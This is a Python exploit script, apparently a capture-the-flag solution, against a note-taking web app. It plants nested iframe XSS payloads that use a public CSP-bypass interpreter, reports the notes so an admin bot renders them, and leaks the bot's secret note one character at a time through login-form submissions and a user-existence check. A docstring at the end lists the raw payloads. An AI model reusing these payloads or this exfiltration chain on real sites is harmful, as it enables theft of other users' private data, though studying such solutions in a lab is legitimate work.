#!/usr/bin/env python3

import requests
import json
import time

URL = "http://10.113.184.121:10082/"
# URL = "http://localhost:10082/"

NONCE = "gogomowmi"  # can be at most 15, originally `nonce`
USERNAME = "qwe85"
PASSWORD = USERNAME  # originally `aaaaa`
SESSION = requests.Session()


# When session is None, it's use to check the existence of the user.
def login(username, password, session=None):
    # print(username, password)
    if session is None:
        r = requests.post(
            URL + "login", data={"username": username, "password": password}
        )
    else:
        r = SESSION.post(
            URL + "login", data={"username": username, "password": password}
        )

    if "Invalid username or password!" not in r.text:
        return False

    # print(r.text)

    return True


# [{"author":"qwe85","id":"d900809a-1afa-4c08-b46f-6c49dc6a7496","title":"alert(document.cookie)"},{"author":"qwe85","id":"bb301b0b-5646-47de-82be-584ab89d49f4","title":"alert(parent.parent.document.cookie)"},{"author":"qwe85","id":"5fe70f0b-510e-44a1-a115-ba139ae9a0b6","title":"console.log(document.cookie)"},{"author":"qwe85","id":"a20748b0-bbfa-4ae8-8018-f0c51546f5a0","title":"console.log(parent.parent.document.cookie)"}]
def get_notes():
    r = SESSION.get(URL + "api/notes/all")
    return json.loads(r.text)


# {"id":"d34e8352-394d-4655-9d53-1e4c1c744825"}
def create_note(title, content):
    r = SESSION.post(URL + "api/notes", json={"title": title, "content": content})
    # print(title, content)
    # print(type(content))
    # print(r.text)
    return json.loads(r.text)["id"]


def report(note_id, author):
    r = SESSION.post(URL + "report", data={"note_id": note_id, "author": author})
    return r


def demo():
    # print(login("qwe85", "qwe85")) # True
    # print(login("qwe85", "qwe85")) # True
    # print(login("qwe87", "qwe87")) # False
    # print(login("qwe87", "qwe87")) # True
    # print(login("qwe87", "qwe85")) # False
    # print(create_note("from python", "from python"))
    # print(get_notes())
    # report("4d653e21-e14c-4ad6-a024-d2d8753c3fa6", "qwe85")

    # print(login("qwe85", "qwe85"))
    # print(login("qwe85", "qwe85", SESSION))
    # print(get_notes())
    pass


def check_user_existence(username):
    return login(username, NONCE)


def script_to_html(script):
    return f"<iframe srcdoc=\"<br csp='{script}'><script src='https://unpkg.com/csp-bypass/dist/sval-classic.js'></script>\"></iframe>"


def index_to_username(index):
    return (
        f"{index}_{NONCE}_"
        + "${top.a.b.note.children[2].textContent.charCodeAt("
        + f"{index}"
        + ")}"
    )


def note_id_to_iframe(note_id):
    return f"<iframe src='/note?id={note_id}&author={USERNAME}'></iframe>"


def register_index_nonce_ascii_at(index):
    g1_id = create_note(
        f"{NONCE}_{index}_g1",
        script_to_html(f"setTimeout(()=>top.a.b.noteList.children[0].click(),0)"),
    )

    g2_id = create_note(
        f"{NONCE}_{index}_g2",
        script_to_html(
            "setTimeout(()=>top.a.c[&quot;login-form&quot;].username.value=`"
            + index_to_username(index)
            + "`,1000)"
        ),
    )

    g3_id = create_note(
        f"{NONCE}_{index}_g3",
        script_to_html(
            "setTimeout(()=>top.a.c[&quot;login-form&quot;].password.value=`"
            + index_to_username(index)
            + "`,1000)"
        ),
    )

    g4_id = create_note(
        f"{NONCE}_{index}_g4",
        script_to_html("setTimeout(()=>top.a.c[&quot;login-form&quot;].submit(),2000)"),
    )

    note2_id = create_note(
        f"{NONCE}_{index}_note2",
        '<iframe srcdoc="'
        + note_id_to_iframe(g3_id)
        + note_id_to_iframe(g4_id)
        + '"></iframe>',
    )

    note_1_id = create_note(
        f"{NONCE}_{index}_note1",
        '<iframe srcdoc="'
        + note_id_to_iframe(note2_id)
        + note_id_to_iframe(g2_id)
        + '"></iframe>',
    )

    note0_id = create_note(
        f"{NONCE}_{index}_note0",
        '<iframe srcdoc="'
        + note_id_to_iframe(note_1_id)
        + note_id_to_iframe(g1_id)
        + '"></iframe>',
    )

    root_id = create_note(
        f"{NONCE}_{index}_root",
        "<iframe name=\"a\" srcdoc=\"<iframe name='b' src='/'></iframe><iframe name='c' src='/login'></iframe>"
        + note_id_to_iframe(note0_id)
        + '"></iframe>',
    )

    report(root_id, USERNAME)
    return root_id


# f"{index}_{NONCE}_{ascii_code}"
def check_flag_at(index):
    for i in range(32, 127):
        # login(f"{index}_{NONCE}_{i}", f"nnnnn")
        if login(f"{index}_{NONCE}_{i}", f"nnnnn"):
            return chr(i)
    return None


def main():
    print(login(USERNAME, PASSWORD, SESSION))  # Register
    print(login(USERNAME, PASSWORD, SESSION))  # Login

    # print(get_notes())

    # print(register_index_nonce_ascii_at(8))
    # print(check_flag_at(8))

    for i in range(64):
        print(register_index_nonce_ascii_at(i))

    time.sleep(5)

    flag = ""
    for i in range(64):
        flag += check_flag_at(i)
        print(flag)


if __name__ == "__main__":
    main()

"""
<!-- ROOT -->
<!-- a: ROOT
        b: '/'
        c: '/login'
        d: 'NOTE 0' -->
<iframe name="a" srcdoc="<iframe name='b' src='/'></iframe><iframe name='c' src='/login'></iframe><iframe name='d' src='/note?id=0b5dbe88-4b8b-42e4-858b-1434466b9f11&author=aaaaa'></iframe>"></iframe>

<!-- NOTE 0 -->
<!-- /note?id=0b5dbe88-4b8b-42e4-858b-1434466b9f11 -->
<!-- g1, NOTE 1 -->
<iframe srcdoc="<iframe src='/note?id=65655578-120e-49ae-abc9-10625db93672&author=aaaaa'></iframe><iframe src='/note?id=f4b7b0c6-e09b-4efe-bf0e-9e58a2b03fa1&author=aaaaa'></iframe>"></iframe>

<!-- NOTE 1 -->
<!-- /note?id=f4b7b0c6-e09b-4efe-bf0e-9e58a2b03fa1 -->
<!-- g2, NOTE 2 -->
<iframe srcdoc="<iframe src='/note?id=acfe7131-717b-4f8f-a141-caebe3b5c7a4&author=aaaaa'></iframe><iframe src='/note?id=b999de79-6298-4109-baa1-a2e5d79fea9c&author=aaaaa'></iframe>"></iframe>

<!-- NOTE 2 -->
<!-- /note?id=b999de79-6298-4109-baa1-a2e5d79fea9c -->
<!-- g3, g4 -->
<iframe srcdoc="<iframe src='/note?id=3cd94b5b-fd59-4085-aab1-ea67b6e001ac&author=aaaaa'></iframe><iframe src='/note?id=95db2360-d9fa-49ce-b66b-7f586e1099c5&author=aaaaa'></iframe>"></iframe>

<!-- g1 -->
<!-- setTimeout(()=>top.a.b.noteList.children[0].click(),0); -->
<!-- /note?id=65655578-120e-49ae-abc9-10625db93672 -->
<iframe srcdoc="<br csp='setTimeout(()=>top.a.b.noteList.children[0].click(),0)'><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>

<!-- g2 -->
<!-- setTimeout(()=>top.a.c["login-form"].username.value=`5nonce${top.a.b.note.children[2].textContent.charCodeAt(5)}`,1000); -->
<!-- /note?id=acfe7131-717b-4f8f-a141-caebe3b5c7a4 -->
<iframe srcdoc="<br csp='setTimeout(()=>top.a.c[&quot;login-form&quot;].username.value=`5nonce${top.a.b.note.children[2].textContent.charCodeAt(5)}`,1000)'><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>

<iframe srcdoc='<br csp=&quot;setTimeout(()=>top.a.c[&quot;login-form&quot;].username.value=`8_nonce_qwe85_2_${top.a.b.note.children[2].textContent.charCodeAt(8)}`,1000)&quot;><script src=&quot;https://unpkg.com/csp-bypass/dist/sval-classic.js&quot;></script>'></iframe>

<!-- g3 -->
<!-- setTimeout(()=>top.a.c["login-form"].password.value=`5nonce${top.a.b.note.children[2].textContent.charCodeAt(5)}`,1000); -->
<!-- /note?id=3cd94b5b-fd59-4085-aab1-ea67b6e001ac -->
<iframe srcdoc="<br csp='setTimeout(()=>top.a.c[&quot;login-form&quot;].password.value=`5nonce${top.a.b.note.children[2].textContent.charCodeAt(5)}`,1000)'><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>

<!-- g4 -->
<!-- setTimeout(()=>top.a.c["login-form"].submit(),2000); -->
<!-- /note?id=95db2360-d9fa-49ce-b66b-7f586e1099c5 -->
<iframe srcdoc="<br csp='setTimeout(()=>top.a.c[&quot;login-form&quot;].submit(),2000)'><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>

"""
